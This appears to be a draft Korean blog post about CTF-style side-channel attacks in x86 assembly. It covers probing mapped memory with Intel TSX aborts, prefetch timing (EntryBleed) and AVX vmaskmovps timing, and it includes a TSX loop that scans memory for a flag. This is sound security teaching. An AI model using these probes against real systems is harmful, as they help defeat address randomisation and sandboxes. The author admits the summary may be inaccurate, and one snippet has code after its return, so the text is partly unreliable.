---
date : '2026-02-09T17:10:41+09:00'
draft : true
title : 'Side Channel Attack(with assembly)'
categories : ['Pwnable']
tags : ['side-channel-attack', 'Assembly', 'Timing attack']
---


이번 글에서는 Assembly를 활용한 Side-channel attack에 대해서 알아보겠다.

### 1. intel TSX assembly

 intel TSX assembly란 x86명령어의 확장으로 transational memory 기술에 대한 하드웨어적인 지원을 제공한다. 그것은 개발자들로 하여금 명령어의 원자적 실행을 가능하게 하며 지속성과 고립성을 보장해준다. 여기서 중요한점은 Intel TSX 트랜잭션 내부에서는 잘못된 메모리 참조가 발생해도 예외(SIGSEGV)로 이어지지 않고 트랜잭션이 실패(Abort)하면서 안전하게 빠져나올 수 있다는 것이다. 이를 이용하면 특정 메모리의 매핑 여부를 확인 가능하다. 

*TSX 문법을 지원 안 할 수도 있으므로 cat /proc/cpuinfo를 이용해서 미리 확인 하도록 하자.

```
.intel_syntax noprefix

mov rsi, 0             /* Starting Address */
mov ecx, 0xdeadbeef    /* flag format

1:
add rsi, 0x1000         /* Increment address by page size */
xbegin 1b               /* Initiate TSX transaction */
cmp ecx, [rsi]          /* Check if [rsi] == flag format */
xend                    /* End transaction */
jne 1b                  /* Retry if not matched */


mov rdx, 0x32           /* Length = 50 bytes */
mov rdi, 1              /* STDOUT */
mov rax, 1              /* SYS_write */
syscall
```

### 2. prefetcht

prefetcht는 CPU 캐시에 미리 주소를 올려 놓아서 명령어의 효율성을 높이기 위해 만들어졌다. 여기에서 취약점이 발생한다. 캐시에 올리는 주소가 매핑이 안되있어도 예외(SIGSEGV)가 발생하지 않는다. 또한 prefetcht를 통해 접근 한 주소가 매핑이 안되있으면 명령어 실행이 오래 걸리는 것을 이용하여 시간을 측정한다. 그리고 측정한 시간을 비교하여 매핑이 되어있는 곳을 찾는다. 다음 공격은 커널에서 **EntryBleed**라는 기법으로도 알려져있다.

```
prefetch_time:
    rdtsc
    mov edi, eax
    lfence
    prefetchnta [rsi]
    prefetcht2 [rsi]
    prefetcht1 [rsi]
    prefetcht0 [rsi]
    lfence
    rdtsc
    sub eax, edi
    add ebx, eax
    loop prefetch_time
```

rdtsc는 cpu 사이클을 측정 후 rax, rdi에 그 값을 저장한다. lfence는 읽기 명령어의 순서를 보장해준다.

### 3.  AVX Timing Side-Channel Attack

현대 x86 64 프로세서는 성능 향상을 위해 Single Instruction Multiple Data (SIMD)을 지원한다. 하지만 이러한 명령어들은 보안 문제를 야기할 수 있다. Advanced Vector Extensions (AVX)가 그 예시이다. 아래 코드를 보고 이해해보자.

```
avx_time:
    vpxor       ymm0, ymm0, ymm0
    mfence
    rdtsc
    lfence
    vmaskmovps  ymm0, ymm0, [rsi]
    lfence
    rdtsc
    ret
    sub eax, edi
    add ebx, eax
    loop avx_time
```

여기서 vmaskmovps는 vmaskmovps ymm_dest, ymm_mask, [addr]와 같은 형식이다. 이 명령어는 addr에 있는 정보를 dest에 저장을 하는데 이때 mask에 따라 실제 접근을 할지 안할지 결한다. 여기서 취약점이 존재하는데 mapped 주소랑 unmaped 주소간의 접근 시간이 차이가 나는 것이다. 따라서 ymm_mask에 0을 넣고 이 명령어를 실행 시키면 시간이 짧은게 mapped일 확률이 높다.


### 마치며

이번글에서는 어셈블리를 활용해 매핑 여부를 확인하는 side channel attack들에 대해서 알아보았다. 논문을 읽고 요약을 해서 조금 부정확 정보나 잘못된 내용이 있을 수도 있으니 만약 깊은 원리나 더 자세한 공격방식을 보고 싶다면 아래 논문들을 읽어보도록하자.

references: [https://arxiv.org/pdf/2304.07940](https://arxiv.org/pdf/2304.07940), [https://www.usenix.org/conference/usenixsecurity22/presentation/lipp](https://www.usenix.org/conference/usenixsecurity22/presentation/lipp), [https://bugnotfound.com/posts/htb-business-ctf-2024-abusing-intel-tsx-to-solve-a-sandbox-challenge/](https://bugnotfound.com/posts/htb-business-ctf-2024-abusing-intel-tsx-to-solve-a-sandbox-challenge/)